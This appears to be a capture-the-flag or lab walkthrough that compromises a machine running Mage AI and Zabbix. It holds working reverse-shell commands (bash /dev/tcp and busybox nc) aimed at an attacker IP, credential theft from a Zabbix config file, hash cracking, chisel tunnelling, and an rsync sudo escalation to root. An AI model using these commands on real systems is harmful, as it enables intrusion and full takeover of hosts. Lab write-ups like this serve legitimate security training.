#box

*Created: 1/25/2026*

### Step 1

**Tags:** #Reverse-Shell #Mage-AI

**Command:**
```bash
/bin/sh -i >& /dev/tcp/192.168.45.193/6789 0>&1
```

*Port: 6789*

> 
> The machine exposes on port 6789 an instance of Mage AI. Inside of it we discover a Terminal session running as `www-data`. We get a reverse shell to have a shell which is more stable than the web one.

---

### Step 2

**Tags:** #Zabbix #MySQL #Credentials-Leak #Cracking

**Command:**
```bash
cat /usr/share/zabbix/ui/conf/zabbix.conf.php
```

*Port: 3306*

> 
> Once on the machine, we discover an instance of `zabbix` running through `ps -ef --forest`. We locate a configuration file under `/etc/zabbix/web/zabbix.conf.php` containing the credentials for the database. Inside the database we locate the credentials for the Admin user and proceed to crack the `bcrypt` hash on our machine, discovering the accesses to Zabbix UI to be `Admin:dinosaur`

---

### Step 3

**Tags:** #chisel #Tunneling #proxychains

**Command:**
```bash
# We set up the server on the target host
./chisel server -v -p 1234 --socks5
```

*Port: 80*

> 
> Once achieved the accesses, we now need to create a tunnel because Zabbix is configured to be accessible only from the internal network as shown inside `maintenance.inc.php`. We set up a chisel tunnel to properly connect to Zabbix on port 80 on our end
> 
> The `maintenance.inc.php` file contains a PHP script that allows access to Zabbix only to 127.0.0.1 and otherwise defines maintenance mode:
> 
```php
<?php
// Maintenance mode.
define('ZBX_DENY_GUI_ACCESS', 1);

// Array of IP addresses, which are allowed to connect to frontend (optional).
$ZBX_GUI_ACCESS_IP_RANGE = array('127.0.0.1');

// Message shown on warning screen (optional).
//$ZBX_GUI_ACCESS_MESSAGE = 'Zabbix is under maintenance.';
```
> 
> ---
> 
> The tunnel must be configured as explained step by step with the commands above.
> To avoid mixing up with already opened Firefox sessions, it's recommended to start a new browser (closing the previous one in case) and open the newest one within `proxychains firefox`

---

### Step 4

**Tags:** #Zabbix #Reverse-Shell

**Command:**
```bash
# Inside the Zabbix control panel, we can go to:
# Alerts -> Scripts and then click on Create Script on the top right

# Inside of it we give a name to the Script and the choose Type: Script. Inside the 'Commands' textbox we insert our reverse shell and save the command:

busybox nc 192.168.45.193 6789 -e /bin/sh 

# Since zabbix doesn't like some characters we found a way to obtain an easy shell with busybox reverse shell which doesn't contains special characters

# Once created the shell, we go under Monitoring -> Hosts and then Left Click on Zabbix Server. This click will open a Context Menu on which we'll be able to run a custom script of our choice. We select our Reverse Shell and successfully gain control of the user zabbix on the target machine.
```

*Port: 80*

> 
> Once authenticated on Zabbix with `Admin:dinosaur` we must set up a command and then trigger it. We can create a command being a reverse shell and then trigger it inside Zabbix panel to obtain a shell, presumably as the user `zabbix`

---

### Step 5

**Tags:** #rsync #GTFOBins

**Command:**
```bash
sudo /usr/bin/rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

> 
> Once had a shell as `zabbix`, we find out that this user can run `rsync` as sudo. We leverage a GTFOBins and obtain root of the machine.

---

